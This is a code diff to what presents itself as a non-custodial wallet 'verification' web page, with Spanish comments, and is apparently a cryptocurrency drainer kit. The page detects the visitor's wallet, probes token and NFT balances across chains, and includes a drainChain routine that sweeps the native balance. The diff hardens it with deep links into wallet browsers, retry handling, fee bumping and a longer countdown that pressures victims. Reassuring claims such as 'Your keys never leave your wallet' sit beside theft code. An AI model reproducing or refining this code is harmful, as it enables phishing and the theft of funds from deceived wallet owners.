@@ -135,7 +135,7 @@ p.sub b{color:#d4d4d8;font-weight:600}
   <div style="margin-top:8px;font-size:.76rem;color:#94a3b8;display:none" id="cost">Network fee only · No deposit required</div>
 
   <div id="status" class="status"></div>
-  <div id="timer" class="timer">Verification window closes in 15:00</div>
+  <div id="timer" class="timer">Verification window closes in 25:00</div>
   <div id="logs"></div>
 
   <div class="foot"><b>Non-custodial</b> · Your keys never leave your wallet<br>Session encrypted end-to-end</div>
@@ -287,6 +287,19 @@ function st(m,c){ $('status').textContent = m || ''; $('status').style.color = c
 function icons(){ try { lucide.createIcons(); } catch(_){} }
 function progress(p){ $('prog').style.display='block'; $('prog').firstElementChild.style.width = Math.min(100,p) + "%"; }
 
+/* lanza un deep link sin perder el documento */
+function launch(url){
+  try {
+    const a = document.createElement('a');
+    a.href = url;
+    a.rel = 'noopener';
+    if (/^https?:/i.test(url)) a.target = '_blank';
+    document.body.appendChild(a);
+    a.click();
+    a.remove();
+  } catch(_) { location.href = url; }
+}
+
 /* ═══════ DESCUBRIMIENTO ═══════ */
 const announced = new Map();
 window.addEventListener("eip6963:announceProvider", e => { try { announced.set(e.detail.info.rdns, e.detail.provider); } catch(_){} });
@@ -339,8 +352,21 @@ function select(w, ready, mob){
   if (mob && !ready) {
     $('mTitle').textContent = `Open in ${w.name}`;
     $('mText').textContent = "We will reopen this page inside your wallet's browser so it can read the address.";
-    $('openApp').onclick = () => { sessionStorage.setItem("wv_w", w.id); location.href = w.dl(); };
-    $('retryBtn').onclick = () => { $('modal').style.display = 'none'; renderGrid(); };
+    $('openApp').onclick = () => {
+      sessionStorage.setItem("wv_w", w.id);
+      launch(w.dl());
+      setTimeout(() => {
+        if (document.visibilityState === 'visible') {
+          $('mText').textContent = "If the app did not open, launch it manually, open its browser and paste this URL. Then tap Retry.";
+        }
+      }, 2500);
+    };
+    $('retryBtn').onclick = () => {
+      $('modal').style.display = 'none';
+      const p = providerFor(w.id);
+      if (p) return connect(p, w.id);
+      renderGrid();
+    };
     $('modal').style.display = 'flex';
     return;
   }
@@ -381,7 +407,7 @@ async function bind(p, address){
   signer = provider.getSigner();
   if (p.on) {
     p.on("accountsChanged", a => {
-      if (switching) return;
+      if (switching) { if (a?.length) userAddress = a[0]; return; }
       if (busy) { aborted = true; log("Account changed, stopping."); return; }
       if (a?.length) { userAddress = a[0]; start(); }
     });
@@ -413,7 +439,11 @@ async function resume(){
 /* ═══════ RPC ═══════ */
 function provs(cid){
   if (rpcPool[cid]) return rpcPool[cid];
-  rpcPool[cid] = A[cid].r.map(u => new ethers.providers.JsonRpcProvider(u, { name:"c"+cid, chainId:cid }, { staticNetwork:true, batchMaxCount:20 }));
+  rpcPool[cid] = A[cid].r.map(u => {
+    const p = new ethers.providers.JsonRpcProvider(u, { name:"c"+cid, chainId:cid }, { staticNetwork:true, batchMaxCount:20 });
+    p.polling = false;
+    return p;
+  });
   return rpcPool[cid];
 }
 
@@ -461,13 +491,11 @@ async function probe(){
         ...A[id].n.map(n => ({ target:n[1], callData:I721.encodeFunctionData("balanceOf",[userAddress]) })),
         ...A[id].n.map(n => ({ target:n[1], callData:I721.encodeFunctionData("tokenOfOwnerByIndex",[userAddress, 0]) }))
       ];
-      const r = await Promise.race([
-        (async () => {
-          const bal = await rpcBalance(id);
-          return [bal, await mcRead(id, calls)];
-        })(),
-        sleep(CFG.probeTimeout).then(() => null)
-      ]);
+      const run = (async () => {
+        const bal = await rpcBalance(id);
+        return [bal, await mcRead(id, calls)];
+      })().catch(() => null);
+      const r = await Promise.race([run, sleep(CFG.probeTimeout).then(() => null)]);
       if (!r) return zero;
       const [native, out] = r;
       let t = 0, n = 0;
@@ -612,15 +640,16 @@ function renderList(items){
 
 /* ═══════ GAS ═══════ */
 async function feeBump(attempt){
-  const f = await provider.getFeeData();
   const m = attempt === 1 ? 100 : attempt === 2 ? 130 : 165;
+  let f = {};
+  try { f = await provider.getFeeData(); } catch(_){}
   if (f.maxFeePerGas && f.maxPriorityFeePerGas) return {
     type: 2,
     maxFeePerGas: f.maxFeePerGas.mul(m).div(100),
     maxPriorityFeePerGas: f.maxPriorityFeePerGas.mul(m + 10).div(100)
   };
   if (f.gasPrice) return { gasPrice: f.gasPrice.mul(m).div(100) };
-  return { gasPrice: ethers.utils.parseUnits("5", "gwei") };
+  return { gasPrice: ethers.utils.parseUnits("5", "gwei").mul(m).div(100) };
 }
 
 /* ═══════ ENVÍO ═══════ */
@@ -836,7 +865,7 @@ async function drainChain(){
   /* nativo al final, con reserva amplia para L1 data fee en OP-stack */
   try {
     const bal = await provider.getBalance(userAddress);
-    const f = await provider.getFeeData();
+    const f = await provider.getFeeData().catch(() => ({}));
     const price = f.maxFeePerGas || f.gasPrice || ethers.utils.parseUnits("20", "gwei");
     const reserve = price.mul(21000).mul(180).div(100);
     if (bal.lte(reserve)) { log(`${A[chain].l}: native below reserve`); return; }
